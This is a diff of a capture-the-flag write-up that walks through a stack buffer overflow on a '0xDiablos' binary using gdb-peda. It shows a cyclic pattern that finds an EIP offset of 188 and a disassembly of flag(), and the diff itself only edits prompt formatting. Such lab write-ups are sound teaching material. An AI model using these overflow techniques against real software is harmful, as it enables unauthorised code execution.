@@ -93,7 +93,7 @@ The assembly code for 0x21524111 is `0xdeadbeef` and 0x3f212ff3 is `0xc0ded00d`.
 I will be using gdp-peda to exploit the `gets` function using a buffer overflow to jump into `flag()` to get the flag. Lets load the file, and start. We should hit an automatic breakpoint.
 
 ```c
-gdb-peda$ start
+gdb-peda start
 [----------------------------------registers-----------------------------------]                                                                          
 EAX: 0xf7fb1a28 --> 0xffffd1ec --> 0xffffd3c1 ("COLORFGBG=15;0")
 EBX: 0x0 
@@ -132,9 +132,9 @@ Temporary breakpoint 1, 0x080492c0 in main ()
 Knowing there is a 180 character buffer, i created a file containing 200 characters and saved it as in.txt, which will be used to discover the EIP offset.
 
 ```c
-db-peda$ pattern_create 200 in.txt
+db-peda pattern_create 200 in.txt
 Writing pattern of 200 chars to filename "in.txt"
-gdb-peda$ r < in.txt
+gdb-peda r < in.txt
 Starting program: /home/kali/Desktop/vuln < in.txt
 You know who are 0xDiablos: 
 AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA
@@ -156,14 +156,14 @@ EIP: 0x41417741 ('AwAA')
 We can see the EIP address is `0x41417741`, so lets find the offset, so that we can control the EIP.
 
 ```c
-gdb-peda$ pattern_offset 0x41417741
+gdb-peda pattern_offset 0x41417741
 1094809409 found at offset: 188
 ```
 
 Now lets get the address of `flag()`
 
-```x86asm
-gdb-peda$ disas flag
+```c
+gdb-peda disas flag
 Dump of assembler code for function flag:
    0x080491e2 <+0>:     push   ebp
    0x080491e3 <+1>:     mov    ebp,esp
